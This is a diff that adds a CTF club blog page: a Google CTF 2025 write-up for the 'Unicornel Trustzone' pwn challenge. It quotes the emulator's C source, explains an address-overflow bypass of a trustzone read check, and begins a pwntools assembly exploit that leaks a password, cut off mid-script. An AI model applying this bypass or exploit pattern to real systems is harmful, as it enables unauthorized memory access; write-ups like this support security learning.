@@ -1,0 +1,648 @@
+<!doctype html><html lang=en><head><script>MathJax={tex:{inlineMath:[['$','$'],['\\(','\\)']],displayMath:[['$$','$$'],["\\[","\\]"]],processEscapes:true,processEnvironments:true}}</script><script async id=MathJax-script src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="text/html; charset=UTF-8" http-equiv=content-type><meta content="width=device-width,initial-scale=1,user-scalable=no" name=viewport><meta content="index, follow" name=robots><title>Unicornel-Trustzone</title><meta content=Unicornel-Trustzone name=title><meta content=exploiitm name=author><meta content="Official blog of Cybersecurity Club, IIT Madras" name=description><meta content=website property=og:type><meta content=https://exploiitm.github.io/blog/writeups/GoogleCTF2025/unicornel-trustzone/ property=og:url><meta content="exploiitm blog" property=og:site_name><meta content=Unicornel-Trustzone property=og:title><meta content="Official blog of Cybersecurity Club, IIT Madras" property=og:description><meta content=https://exploiitm.github.io/blog/favicon.ico property=og:image><meta content=summary_large_image property=twitter:card><meta content=https://exploiitm.github.io/blog/writeups/GoogleCTF2025/unicornel-trustzone/ property=twitter:url><meta content=Unicornel-Trustzone property=twitter:title><meta content="Official blog of Cybersecurity Club, IIT Madras" property=twitter:description><meta content=https://exploiitm.github.io/blog/favicon.ico property=twitter:image><link href=https://exploiitm.github.io/blog/writeups/GoogleCTF2025/unicornel-trustzone/ rel=canonical><link rel="shortcut icon" href=https://exploiitm.github.io/blog/favicon.ico type=image/x-icon><link href=https://speyll.github.io/suCSS/reset-min.css rel=stylesheet><link href=https://speyll.github.io/suCSS/suCSS-min.css rel=stylesheet><link href=https://exploiitm.github.io/blog/css/style.css rel=stylesheet><script defer src=https://exploiitm.github.io/blog/js/script.js></script><body><header><nav id=nav-bar><a href=https://exploiitm.github.io/> home </a><a href=/blog> blog </a><a href=/blog/writeups> writeups </a><a href=/blog/about> about </a><a href=/blog/contacts> contact </a><div><input id=theme-toggle style=display:none type=checkbox><label for=theme-toggle id=theme-toggle-label><svg class=icons id=theme-icon><use href=https://exploiitm.github.io/blog/icons.svg#lightMode></use></svg></label><audio id=theme-sound><source src=https://exploiitm.github.io/blog/click.ogg type=audio/ogg></audio></div></nav></header><main><div><a href=..>..</a>/<span class=accent-data>unicornel-trustzone</span></div><time datetime=2025-08-07>Published on: <span class=accent-data>2025-08-07</span></time><address rel=author>By <span class=accent-data> anirud, and exploiitm </span></address><h1>Unicornel-Trustzone</h1><h1 id=pwn-unicornel-trustzone>Pwn - Unicornel Trustzone</h1><p>Unicornel was broken, on that we will concur But I’ve removed all of the bugs now, I am quite sure<h2 id=analysis>Analysis</h2><p>The handout comes with: <code>chal.c</code> - source file <code>chal</code> - binary <code>Documentation</code> - Overview of emulator <code>syscall.c</code> - system call functions <code>unicornel.h</code> - header file for unicorn emulator<p>Go through the Documentation thoroughly to understand how the emulator works, how processes are managed, how the processes interact with the host system and each other. We notice that a trustzone system is followed, where a section of memory requires elevated privilege to work with. We also see that there are three given trustzones <code>create_map_shared_x86_64</code> <code>map_shared_x86_64</code> <code>memprot_x86_64</code><p>Let’s see what chal.c contains In summary, it just contains a detailed implementation of the emulator, and the system calls. When the emulator starts, it takes in the unicornelf header, and the code. The emulated processes interact with the emulator through system calls. And the program handles the way the emulator interacts with the host.<p>On analysing the key functions in syscalls.c We see that a trustzone mechanism is implemented that is checked using <code>TRUSTED_SYSCALL</code>, that ensures that only trusted callers can call certain system calls, and access the trustzone’s memory.<p><code>create_trustzone</code> – creates a trustzone where trusted system calls can be executed by <code>trustzone_invoke</code>. <code>trustzone_invoke</code> – temporarily sets <code>trustzone_mode</code> to be true, and executes code in the trustzone.<p><img alt="Binary protections of chal" src=https://exploiitm.github.io/blog/writeups/GoogleCTF2025/unicornel-trustzone/./sec.png><h3 id=how-is-the-trustzone-protected-from-normal-processes>How is the trustzone protected from normal processes?</h3><p><code>trustzone_mode</code> ensures only trusted processes can execute functions like <code>validate_handle</code>, <code>map_address</code>, <code>memprot</code>, etc, that are protected by the <code>TRUSTED_SYSCALL</code> macro. <code>create_trustzone</code> adds a hook at the trustzone that intercepts when normal processes try to access a trustzone. A trustzone is protected by <code>r-x</code> permissions that doesn’t allow normal processes to writing in a trustzone.<pre class=language-c data-lang=c style=background:#282828;color:#fdf4c1aa><code class=language-c data-lang=c><span style=font-style:italic;color:#928374>//The trustzone is allowed to access trusted memory, no one else is.
+</span><span style=color:#fa5c4b>void </span><span style=color:#8ec07c>trusted_read</span><span>(uc_engine </span><span style=color:#fe8019>*</span><span style=color:#fdf4c1>uc</span><span>, uc_mem_type </span><span style=color:#fdf4c1>type</span><span>, </span><span style=color:#fabd2f>uint64_t </span><span style=color:#fdf4c1>address</span><span>, </span><span style=color:#fa5c4b>int </span><span style=color:#fdf4c1>size</span><span>, </span><span style=color:#fabd2f>int64_t </span><span style=color:#fdf4c1>value</span><span>, </span><span style=color:#fa5c4b>void</span><span style=color:#fe8019>* </span><span style=color:#fdf4c1>user_data</span><span>) {
+</span><span>    </span><span style=color:#fa5c4b>struct</span><span> process</span><span style=color:#fe8019>*</span><span> current </span><span style=color:#fe8019>=</span><span> user_data;
+</span><span>    </span><span style=color:#fabd2f>fprintf</span><span style=color:#fdf4c1>(stderr,</span><span style=color:#b8bb26>"TRUSTED READ: </span><span style=color:#fdf4c1>%p %p</span><span style=color:#b8bb26>\n"</span><span style=color:#fdf4c1>,address,current->trustzone)</span><span>;
+</span><span>    </span><span style=color:#fa5c4b>if</span><span>(</span><span style=color:#fe8019>!</span><span>current->trustzone_mode) {
+</span><span>        </span><span style=font-style:italic;color:#928374>//Untrusted code tried to access trusted memory, abort the malicious process
+</span><span>        </span><span style=color:#fabd2f>printf</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"Unprivileged access to trustzone attempted! Killing process\n"</span><span style=color:#fdf4c1>)</span><span>;
+</span><span>        </span><span style=color:#fdf4c1>uc_emu_stop(uc)</span><span>;
+</span><span>    }
+</span><span>}
+</span><span style=color:#fa5c4b>long </span><span style=color:#8ec07c>create_trustzone</span><span>(</span><span style=color:#fa5c4b>struct</span><span> process</span><span style=color:#fe8019>* </span><span style=color:#fdf4c1>current</span><span>) {
+</span><span>    </span><span style=color:#fa5c4b>if</span><span>(current->trusted_zone_hook)
+</span><span>        </span><span style=color:#fa5c4b>return </span><span style=color:#fe8019>-</span><span style=color:#d3869b>1</span><span>;
+</span><span>    uc_engine</span><span style=color:#fe8019>*</span><span> uc </span><span style=color:#fe8019>=</span><span> current->uc;
+</span><span>    </span><span style=color:#fa5c4b>unsigned long</span><span> addr </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>ARG_REGR(current,</span><span style=color:#d3869b>1</span><span style=color:#fdf4c1>)</span><span>;
+</span><span>    </span><span style=color:#fa5c4b>unsigned long</span><span> filename_user </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>ARG_REGR(current,</span><span style=color:#d3869b>2</span><span style=color:#fdf4c1>)</span><span>;
+</span><span>    </span><span style=color:#fa5c4b>char</span><span> filename[</span><span style=color:#d3869b>128</span><span>] </span><span style=color:#fe8019>= </span><span>{ </span><span style=color:#d3869b>0 </span><span>};
+</span><span>    uc_err err </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>strncpy_user(current,filename,filename_user,</span><span style=color:#fe8019>sizeof</span><span style=color:#fdf4c1>(filename))</span><span>;
+</span><span>    </span><span style=color:#fa5c4b>if</span><span>(err </span><span style=color:#fe8019>!=</span><span> UC_ERR_OK) {
+</span><span>        </span><span style=color:#fabd2f>printf</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"Failed to copy string from address </span><span style=color:#fdf4c1>%p</span><span style=color:#b8bb26>\n"</span><span style=color:#fdf4c1>,filename_user)</span><span>;
+</span><span>        </span><span style=color:#fa5c4b>return </span><span style=color:#fe8019>-</span><span style=color:#d3869b>1</span><span>;
+</span><span>    }
+</span><span>    </span><span style=color:#fa5c4b>for</span><span>(</span><span style=color:#fa5c4b>unsigned</span><span> i </span><span style=color:#fe8019>= </span><span style=color:#d3869b>0</span><span>; i </span><span style=color:#fe8019>< sizeof</span><span>(filename); i</span><span style=color:#fe8019>++</span><span>) {
+</span><span>        </span><span style=color:#fa5c4b>if</span><span>(filename[i] </span><span style=color:#fe8019>== </span><span style=color:#b8bb26>'.' </span><span style=color:#fe8019>||</span><span> filename[i] </span><span style=color:#fe8019>== </span><span style=color:#b8bb26>'/'</span><span>) {
+</span><span>            filename[i] </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>'_'</span><span>;
+</span><span>        }
+</span><span>    }
+</span><span>    </span><span style=color:#fa5c4b>int</span><span> fd </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>open(filename,O_RDONLY)</span><span>;
+</span><span>    </span><span style=color:#fa5c4b>if</span><span>(fd </span><span style=color:#fe8019>== -</span><span style=color:#d3869b>1</span><span>) {
+</span><span>        </span><span style=color:#fabd2f>printf</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"Failed to open trustzone </span><span style=color:#fdf4c1>%s</span><span style=color:#b8bb26> %m\n"</span><span style=color:#fdf4c1>,filename)</span><span>;
+</span><span>        </span><span style=color:#fa5c4b>return</span><span> errno;
+</span><span>    }
+</span><span>    </span><span style=color:#fabd2f>off_t</span><span> size </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>lseek(fd,</span><span style=color:#d3869b>0</span><span style=color:#fdf4c1>,SEEK_END)</span><span>;
+</span><span>    err </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>uc_mem_map(uc,addr,PAGE_ALIGN(size),UC_PROT_READ </span><span style=color:#fe8019>|</span><span style=color:#fdf4c1> UC_PROT_EXEC)</span><span>;
+</span><span>    </span><span style=color:#fa5c4b>if</span><span>(err </span><span style=color:#fe8019>!=</span><span> UC_ERR_OK)
+</span><span>    {
+</span><span>      </span><span style=color:#fabd2f>printf</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"Failed on uc_mem_map() with error </span><span style=color:#fdf4c1>%u</span><span style=color:#b8bb26>\n"</span><span style=color:#fdf4c1>,err)</span><span>;
+</span><span>      </span><span style=color:#fdf4c1>close(fd)</span><span>;
+</span><span>      </span><span style=color:#fa5c4b>return </span><span style=color:#fe8019>-</span><span style=color:#d3869b>1</span><span>;
+</span><span>    }
+</span><span>    err </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>uc_hook_add(uc,</span><span style=color:#fe8019>&</span><span style=color:#fdf4c1>current->trusted_zone_hook,UC_HOOK_MEM_READ,trusted_read,current,addr,addr</span><span style=color:#fe8019>+</span><span style=color:#fdf4c1>PAGE_ALIGN(size))</span><span>;
+</span><span>    </span><span style=color:#fa5c4b>if</span><span>(err </span><span style=color:#fe8019>!=</span><span> UC_ERR_OK) {
+</span><span>      </span><span style=color:#fabd2f>printf</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"Failed on uc_hook_add() with error </span><span style=color:#fdf4c1>%u</span><span style=color:#b8bb26>\n"</span><span style=color:#fdf4c1>,err)</span><span>;
+</span><span>      </span><span style=color:#fdf4c1>close(fd)</span><span>;
+</span><span>      </span><span style=color:#fdf4c1>uc_mem_unmap(uc,addr,PAGE_ALIGN(size))</span><span>;
+</span><span>      </span><span style=color:#fa5c4b>return </span><span style=color:#fe8019>-</span><span style=color:#d3869b>1</span><span>; 
+</span><span>    }
+</span><span>    </span><span style=color:#fa5c4b>char</span><span style=color:#fe8019>*</span><span> file </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>calloc</span><span style=color:#fdf4c1>(size,</span><span style=color:#d3869b>1</span><span style=color:#fdf4c1>)</span><span>;
+</span><span>    </span><span style=color:#fdf4c1>lseek(fd,</span><span style=color:#d3869b>0</span><span style=color:#fdf4c1>,SEEK_SET)</span><span>;
+</span><span>    </span><span style=color:#fdf4c1>read(fd,file,size)</span><span>;
+</span><span>    </span><span style=color:#fdf4c1>uc_mem_write(uc,addr,file,size)</span><span>;
+</span><span>    current->trustzone </span><span style=color:#fe8019>=</span><span> addr;
+</span><span>    current->tz_size </span><span style=color:#fe8019>=</span><span> size;
+</span><span>    </span><span style=color:#fdf4c1>close(fd)</span><span>;
+</span><span>    </span><span style=color:#fabd2f>fprintf</span><span style=color:#fdf4c1>(stderr,</span><span style=color:#b8bb26>"Trustzone allocated at </span><span style=color:#fdf4c1>%p %lu</span><span style=color:#b8bb26>\n"</span><span style=color:#fdf4c1>,addr,PAGE_ALIGN(size))</span><span>;
+</span><span>    </span><span style=color:#fa5c4b>return </span><span style=color:#d3869b>0</span><span>;
+</span><span>}
+</span></code></pre><p>This section shows how the syscall creates a trustzone by loading code from a file into memory, and setting <code>r-x</code> permissions. The syscall adds a <code>UC_HOOK_MEM_READ</code> which basically ensures that when <code>trusted_read</code> tries to read a trustzone, the hook ensure <code>trustzone_mode</code> is <code>true</code>. However keep in mind that the trustzone never implements a HOOK for memory writes, knowing that the trustzone isn’t given write permissions.<pre class=language-c data-lang=c style=background:#282828;color:#fdf4c1aa><code class=language-c data-lang=c><span style=color:#fa5c4b>struct</span><span> shared_buffer shared_buffers[MAX_PROCESSES] </span><span style=color:#fe8019>= </span><span>{ </span><span style=color:#d3869b>0 </span><span>};
+</span><span style=color:#fa5c4b>long </span><span style=color:#8ec07c>create_shared</span><span>(</span><span style=color:#fa5c4b>struct</span><span> process</span><span style=color:#fe8019>* </span><span style=color:#fdf4c1>current</span><span>) {
+</span><span>    </span><span style=font-style:italic;color:#928374>// TRUSTED_SYSCALL;
+</span><span>
+</span><span>    </span><span style=color:#fdf4c1>pthread_mutex_lock(</span><span style=color:#fe8019>&</span><span style=color:#fdf4c1>task_lock)</span><span>;
+</span><span>    </span><span style=color:#fa5c4b>unsigned long</span><span> length </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>ARG_REGR(current,</span><span style=color:#d3869b>1</span><span style=color:#fdf4c1>)</span><span>;
+</span><span>    </span><span style=color:#fa5c4b>if</span><span>(length </span><span style=color:#fe8019>> </span><span style=color:#d3869b>0x10000 </span><span style=color:#fe8019>|| !</span><span>length </span><span style=color:#fe8019>||</span><span> length </span><span style=color:#fe8019>& </span><span style=color:#d3869b>0xFFF</span><span>)
+</span><span>    {
+</span><span>        </span><span style=color:#fdf4c1>pthread_mutex_unlock(</span><span style=color:#fe8019>&</span><span style=color:#fdf4c1>task_lock)</span><span>;
+</span><span>        </span><span style=color:#fa5c4b>return </span><span style=color:#fe8019>-</span><span style=color:#d3869b>1</span><span>;
+</span><span>    }
+</span><span>    </span><span style=font-style:italic;color:#928374>//Find an empty shared buffer handle
+</span><span>    </span><span style=color:#fa5c4b>unsigned long</span><span> handle;
+</span><span>    </span><span style=color:#fa5c4b>for</span><span>(handle </span><span style=color:#fe8019>= </span><span style=color:#d3869b>0</span><span>; handle </span><span style=color:#fe8019><</span><span> MAX_PROCESSES; handle</span><span style=color:#fe8019>++</span><span>) {
+</span><span>        </span><span style=color:#fa5c4b>if</span><span>(</span><span style=color:#fe8019>!</span><span>shared_buffers[handle].</span><span style=color:#fdf4c1>refs</span><span>)
+</span><span>            </span><span style=color:#fa5c4b>break</span><span>;
+</span><span>    }
+</span><span>    </span><span style=color:#fa5c4b>if</span><span>(handle </span><span style=color:#fe8019>==</span><span> MAX_PROCESSES) {
+</span><span>        </span><span style=color:#fdf4c1>pthread_mutex_unlock(</span><span style=color:#fe8019>&</span><span style=color:#fdf4c1>task_lock)</span><span>;
+</span><span>        </span><span style=color:#fa5c4b>return </span><span style=color:#fe8019>-</span><span style=color:#d3869b>2</span><span>;
+</span><span>    }
+</span><span>    </span><span style=color:#fa5c4b>void</span><span style=color:#fe8019>*</span><span> buffer </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>calloc</span><span style=color:#fdf4c1>(</span><span style=color:#d3869b>1</span><span style=color:#fdf4c1>,length)</span><span>;
+</span><span>    </span><span style=color:#fa5c4b>if</span><span>(</span><span style=color:#fe8019>!</span><span>buffer) {
+</span><span>        </span><span style=color:#fdf4c1>pthread_mutex_unlock(</span><span style=color:#fe8019>&</span><span style=color:#fdf4c1>task_lock)</span><span>;
+</span><span>        </span><span style=color:#fa5c4b>return </span><span style=color:#fe8019>-</span><span style=color:#d3869b>3</span><span>;
+</span><span>    }
+</span><span>    shared_buffers[handle].</span><span style=color:#fdf4c1>refs </span><span style=color:#fe8019>= </span><span style=color:#d3869b>1</span><span>;
+</span><span>    shared_buffers[handle].</span><span style=color:#fdf4c1>buffer </span><span style=color:#fe8019>=</span><span> buffer;
+</span><span>    shared_buffers[handle].</span><span style=color:#fdf4c1>length </span><span style=color:#fe8019>=</span><span> length;
+</span><span>    </span><span style=color:#fdf4c1>pthread_mutex_unlock(</span><span style=color:#fe8019>&</span><span style=color:#fdf4c1>task_lock)</span><span>;
+</span><span>    </span><span style=color:#fa5c4b>return</span><span> handle;
+</span><span>}
+</span></code></pre><p>This function is important because it creates a shared buffer between processes, and returns a handle. When the handle is validated using <code>validate_handle</code> a pointer to the shared buffer is returned.<pre class=language-c data-lang=c style=background:#282828;color:#fdf4c1aa><code class=language-c data-lang=c><span style=color:#fa5c4b>long </span><span style=color:#8ec07c>validate_handle</span><span>(</span><span style=color:#fa5c4b>struct</span><span> process</span><span style=color:#fe8019>* </span><span style=color:#fdf4c1>current</span><span>) {
+</span><span>    TRUSTED_SYSCALL;
+</span><span>
+</span><span>    </span><span style=color:#fdf4c1>pthread_mutex_lock(</span><span style=color:#fe8019>&</span><span style=color:#fdf4c1>task_lock)</span><span>;
+</span><span>    </span><span style=color:#fa5c4b>unsigned long</span><span> handle </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>ARG_REGR(current,</span><span style=color:#d3869b>1</span><span style=color:#fdf4c1>)</span><span>;
+</span><span>    </span><span style=color:#fa5c4b>unsigned long</span><span> length </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>ARG_REGR(current,</span><span style=color:#d3869b>2</span><span style=color:#fdf4c1>)</span><span>;
+</span><span>    </span><span style=color:#fa5c4b>if</span><span>(handle </span><span style=color:#fe8019>>=</span><span> MAX_PROCESSES </span><span style=color:#fe8019>|| !</span><span>shared_buffers[handle].</span><span style=color:#fdf4c1>refs </span><span style=color:#fe8019>||</span><span> shared_buffers[handle].</span><span style=color:#fdf4c1>length </span><span style=color:#fe8019><</span><span> length) {
+</span><span>        </span><span style=color:#fdf4c1>pthread_mutex_unlock(</span><span style=color:#fe8019>&</span><span style=color:#fdf4c1>task_lock)</span><span>;
+</span><span>        </span><span style=color:#fa5c4b>return </span><span style=color:#d3869b>0</span><span>;
+</span><span>    }
+</span><span>    </span><span style=color:#fdf4c1>pthread_mutex_unlock(</span><span style=color:#fe8019>&</span><span style=color:#fdf4c1>task_lock)</span><span>;
+</span><span>    </span><span style=color:#fa5c4b>return </span><span>(</span><span style=color:#fa5c4b>long</span><span>) shared_buffers[handle].</span><span style=color:#fdf4c1>buffer</span><span>;
+</span><span>}
+</span></code></pre><p>This is crucial considering it allows us access to physical memory addresses on the host.<pre class=language-c data-lang=c style=background:#282828;color:#fdf4c1aa><code class=language-c data-lang=c><span style=color:#fa5c4b>long </span><span style=color:#8ec07c>memprot</span><span>(</span><span style=color:#fa5c4b>struct</span><span> process</span><span style=color:#fe8019>* </span><span style=color:#fdf4c1>current</span><span>) {
+</span><span>    TRUSTED_SYSCALL;
+</span><span>    </span><span style=color:#fa5c4b>unsigned long</span><span> addr </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>ARG_REGR(current,</span><span style=color:#d3869b>1</span><span style=color:#fdf4c1>)</span><span>;
+</span><span>    </span><span style=color:#fa5c4b>unsigned long</span><span> length </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>ARG_REGR(current,</span><span style=color:#d3869b>2</span><span style=color:#fdf4c1>)</span><span>;
+</span><span>    </span><span style=color:#fa5c4b>unsigned long</span><span> prot </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>ARG_REGR(current,</span><span style=color:#d3869b>3</span><span style=color:#fdf4c1>)</span><span>;
+</span><span>    </span><span style=color:#fa5c4b>return </span><span style=color:#fdf4c1>uc_mem_protect(current->uc,addr,length,prot)</span><span>;
+</span><span>}
+</span></code></pre><p>Remember when we noticed how there wasn’t any hook preventing normal users from writing into a trustzone. <code>memprot</code> can be called by the <code>memprot_x86_64</code> trustzone. So we CAN write to a trustzone and execute malicious code by <code>trustzone_invoke</code>. Except we somehow need to fetch the password that is protecting the trustzone from being accessed.<pre class=language-c data-lang=c style=background:#282828;color:#fdf4c1aa><code class=language-c data-lang=c><span style=color:#fa5c4b>long </span><span style=color:#8ec07c>confirm_password</span><span>(</span><span style=color:#fa5c4b>struct</span><span> process</span><span style=color:#fe8019>* </span><span style=color:#fdf4c1>current</span><span>) {
+</span><span>    TRUSTED_SYSCALL;
+</span><span>    </span><span style=color:#fa5c4b>if</span><span>(</span><span style=color:#fe8019>!</span><span>password[</span><span style=color:#d3869b>0</span><span>]) {
+</span><span>        </span><span style=color:#fa5c4b>int</span><span> password_fd </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>open(</span><span style=color:#b8bb26>"password"</span><span style=color:#fdf4c1>,O_RDONLY)</span><span>;
+</span><span>        </span><span style=color:#fa5c4b>if</span><span>(password_fd </span><span style=color:#fe8019>== -</span><span style=color:#d3869b>1</span><span>)
+</span><span>        {
+</span><span>            </span><span style=color:#fabd2f>printf</span><span style=color:#fdf4c1>(</span><span style=color:#b8bb26>"open password failed: %m\n"</span><span style=color:#fdf4c1>)</span><span>;
+</span><span>            </span><span style=color:#fabd2f>abort</span><span style=color:#fdf4c1>()</span><span>;
+</span><span>        }
+</span><span>        </span><span style=color:#fdf4c1>read(password_fd,password,</span><span style=color:#d3869b>16</span><span style=color:#fdf4c1>)</span><span>;
+</span><span>        </span><span style=color:#fdf4c1>close(password_fd)</span><span>;
+</span><span>    }
+</span><span>    </span><span style=color:#fa5c4b>char</span><span> user_password[</span><span style=color:#fe8019>sizeof</span><span>(password)];
+</span><span>    uc_err e </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>strncpy_user(current,user_password,ARG_REGR(current,</span><span style=color:#d3869b>1</span><span style=color:#fdf4c1>),</span><span style=color:#fe8019>sizeof</span><span style=color:#fdf4c1>(user_password))</span><span>;
+</span><span>    </span><span style=color:#fa5c4b>if</span><span>(e </span><span style=color:#fe8019>!=</span><span> UC_ERR_OK) {
+</span><span>        </span><span style=color:#fa5c4b>return </span><span style=color:#d3869b>1</span><span>;
+</span><span>    }
+</span><span>    </span><span style=color:#fa5c4b>return </span><span style=color:#fe8019>!!</span><span style=color:#fabd2f>strncmp</span><span style=color:#fdf4c1>(user_password,password,</span><span style=color:#fe8019>sizeof</span><span style=color:#fdf4c1>(user_password))</span><span>;
+</span><span>}
+</span></code></pre><p>This system call opens a file called password and checks if the password in the file is valid. But if you remember <code>create_trustzone</code> loads a file into the trustzone, essentially loading the password into memory. If only there could be a way for us to read and print the data inside a trustzone.<p>Let’s try to summarize our understandings of what we’ve uncovered until now:<ol><li>There are trustzones that don’t allow you to read without privilege, but writes are possible, if you can change the memory protection permissions.<li>The above requires you to know the password.<li>There is a way to load the password into memory, but we need a way to be able to access data in a trustzone.</ol><h2 id=vulnerability>Vulnerability</h2><pre class=language-c data-lang=c style=background:#282828;color:#fdf4c1aa><code class=language-c data-lang=c><span style=color:#fa5c4b>bool </span><span style=color:#8ec07c>overlaps_tz</span><span>(</span><span style=color:#fa5c4b>struct</span><span> process</span><span style=color:#fe8019>* </span><span style=color:#fdf4c1>current</span><span>,</span><span style=color:#fa5c4b>long </span><span style=color:#fdf4c1>src</span><span>, </span><span style=color:#fa5c4b>unsigned </span><span style=color:#fdf4c1>n</span><span>) {
+</span><span>    </span><span style=color:#fa5c4b>return</span><span> current->trusted_zone_hook </span><span style=color:#fe8019>&& !</span><span>(src </span><span style=color:#fe8019>+</span><span> n </span><span style=color:#fe8019><=</span><span> current->trustzone </span><span style=color:#fe8019>||</span><span> current->trustzone </span><span style=color:#fe8019>+ </span><span style=color:#fdf4c1>PAGE_ALIGN(current->tz_size) </span><span style=color:#fe8019><=</span><span> src);
+</span><span>}
+</span><span>uc_err </span><span style=color:#8ec07c>safe_read</span><span>(</span><span style=color:#fa5c4b>struct</span><span> process</span><span style=color:#fe8019>* </span><span style=color:#fdf4c1>current</span><span>, </span><span style=color:#fa5c4b>char</span><span style=color:#fe8019>* </span><span style=color:#fdf4c1>dst</span><span>, </span><span style=color:#fa5c4b>long </span><span style=color:#fdf4c1>src</span><span>, </span><span style=color:#fabd2f>size_t </span><span style=color:#fdf4c1>n</span><span>) {
+</span><span>    </span><span style=color:#fa5c4b>if</span><span>(</span><span style=color:#fdf4c1>overlaps_tz(current,src,n)</span><span>) TRUSTED_SYSCALL;
+</span><span>    </span><span style=color:#fa5c4b>return </span><span style=color:#fdf4c1>uc_mem_read(current->uc,src,dst,n)</span><span>;
+</span><span>}
+</span><span style=color:#fa5c4b>long </span><span style=color:#8ec07c>unicornel_write</span><span>(</span><span style=color:#fa5c4b>struct</span><span> process</span><span style=color:#fe8019>* </span><span style=color:#fdf4c1>current</span><span>) {
+</span><span>    </span><span style=color:#fa5c4b>unsigned long</span><span> pointer </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>ARG_REGR(current,</span><span style=color:#d3869b>1</span><span style=color:#fdf4c1>)</span><span>;
+</span><span>    </span><span style=color:#fa5c4b>unsigned long</span><span> length </span><span style=color:#fe8019>=  </span><span style=color:#fdf4c1>ARG_REGR(current,</span><span style=color:#d3869b>2</span><span style=color:#fdf4c1>)</span><span>;
+</span><span>    </span><span style=color:#fa5c4b>char</span><span style=color:#fe8019>*</span><span> buffer </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>malloc</span><span style=color:#fdf4c1>(length)</span><span>;
+</span><span>    </span><span style=color:#fa5c4b>if</span><span>(</span><span style=color:#fe8019>!</span><span>buffer) </span><span style=color:#fa5c4b>return </span><span style=color:#fe8019>-</span><span style=color:#d3869b>1</span><span>;
+</span><span>    uc_err err </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>safe_read(current,buffer,pointer,length)</span><span>;
+</span><span>    </span><span style=color:#fa5c4b>if</span><span>(err </span><span style=color:#fe8019>!=</span><span> UC_ERR_OK) {
+</span><span>        </span><span style=color:#fabd2f>free</span><span style=color:#fdf4c1>(buffer)</span><span>;
+</span><span>        </span><span style=color:#fa5c4b>return </span><span style=color:#fe8019>-</span><span style=color:#d3869b>1</span><span>;
+</span><span>    }
+</span><span>    </span><span style=color:#fa5c4b>long</span><span> ret </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>write(current->outfd,buffer,length)</span><span>;
+</span><span>    </span><span style=color:#fabd2f>free</span><span style=color:#fdf4c1>(buffer)</span><span>;
+</span><span>    </span><span style=color:#fa5c4b>return</span><span> ret;
+</span><span>}
+</span></code></pre><p><code>unicornel_write</code> acts as a bridge to output from the emulated process to the host. It employs a <code>safe_read</code> function that calls <code>overlaps_tz</code>. There is a major overflow vulnerability in the way <code>overlaps_tz</code> checks if the source address + size of address is less than the starting of a trustzone. If you just map the source address to <code>0xffffffffff0000</code> and set n to <code>0x10000</code>, it overflows and passes the check. This critically allows us to write data from a trustzone out to the host.<h2 id=exploit>Exploit</h2><p>We can first use the <code>unicornel_write</code> bug to extract the password that we will be loading onto a trustzone. We can also retreive the files containing the code for the other trustzones. Let’s leak <code>memprot_x86_64</code> since we will eventually need it to change permissions.<pre class=language-python data-lang=python style=background:#282828;color:#fdf4c1aa><code class=language-python data-lang=python><span style=color:#fa5c4b>from </span><span>pwn </span><span style=color:#fa5c4b>import </span><span style=color:#d3869b>*
+</span><span style=color:#fa5c4b>import </span><span>unicorn 
+</span><span style=color:#fa5c4b>import </span><span>os 
+</span><span>
+</span><span>context.arch </span><span style=color:#fe8019>= </span><span style=color:#b8bb26>"amd64"
+</span><span>
+</span><span>code </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>asm(
+</span><span style=color:#fdf4c1>        </span><span style=color:#fa5c4b>r</span><span style=color:#b8bb26>'''
+</span><span style=color:#b8bb26>        </span><span style=color:#d3869b>.</span><span style=color:#b8bb26>intel_syntax noprefix
+</span><span style=color:#b8bb26>        
+</span><span style=color:#b8bb26>        /</span><span style=color:#fe8019>*</span><span style=color:#b8bb26> leak password </span><span style=color:#fe8019>*</span><span style=color:#b8bb26>/
+</span><span style=color:#b8bb26>        mov r12, 0xFFFFFFFFFFFFF000
+</span><span style=color:#b8bb26>        mov rbx, r12
+</span><span style=color:#b8bb26>        lea rcx, </span><span style=color:#fdf4c1>[rip+password] </span><span style=font-style:italic;color:#928374>#password is pointer to the string password to name trustzone
+</span><span style=color:#b8bb26>        mov rax, 8 </span><span style=font-style:italic;color:#928374>#call create_trustzone with file named password
+</span><span style=color:#b8bb26>        int 0x80
+</span><span style=color:#b8bb26>
+</span><span style=color:#b8bb26>        mov rbx, r12
+</span><span style=color:#b8bb26>        mov rcx, 0x10 </span><span style=font-style:italic;color:#928374>#to write 0x10 bytes from unicornel_write
+</span><span style=color:#b8bb26>        mov rax, 1 </span><span style=font-style:italic;color:#928374>#call unicornel_write
+</span><span style=color:#b8bb26>        int 0x80
+</span><span style=color:#b8bb26>
+</span><span style=color:#b8bb26>        mov rax, 9
+</span><span style=color:#b8bb26>        int 0x80
+</span><span style=color:#b8bb26>        
+</span><span style=color:#b8bb26>        /</span><span style=color:#fe8019>*</span><span style=color:#b8bb26> leak memprot_x86_64 </span><span style=color:#fe8019>*</span><span style=color:#b8bb26>/
